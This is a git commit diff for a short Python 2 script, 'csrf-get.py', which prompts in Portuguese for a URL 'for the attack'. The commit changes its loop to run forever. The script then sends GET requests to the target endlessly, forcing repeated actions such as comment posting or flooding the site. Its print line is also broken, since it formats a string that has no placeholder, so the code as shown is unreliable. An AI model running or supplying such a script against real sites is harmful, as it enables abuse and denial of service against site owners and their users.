e86b9169ee7f39f6355bf4daa7d6f8772a56cfc1
Jonathan Silva <33843748+jonathansilva@users.noreply.github.com>
2020-05-12 18:18:42 -0300

    Update csrf-get.py

--- csrf-get.py
+++ csrf-get.py
@@ -6,9 +6,9 @@ The ID can be found in the source code of the page
 Example: http://www.test.com/?pag=news&str=VIEW&id=ID-HERE&cmd=comment
 '''
 
-get_url = raw_input("Informe a url com os parametros para o ataque: ")
+target = raw_input("Informe a url com os parametros para o ataque: ")
 count = 0
 
-while get_url:
+while True:
     count +=1
-    print (count, "Enviando requisicao..." % urllib2.urlopen(get_url))
+    print (count, "Enviando requisicao..." % urllib2.urlopen(target))
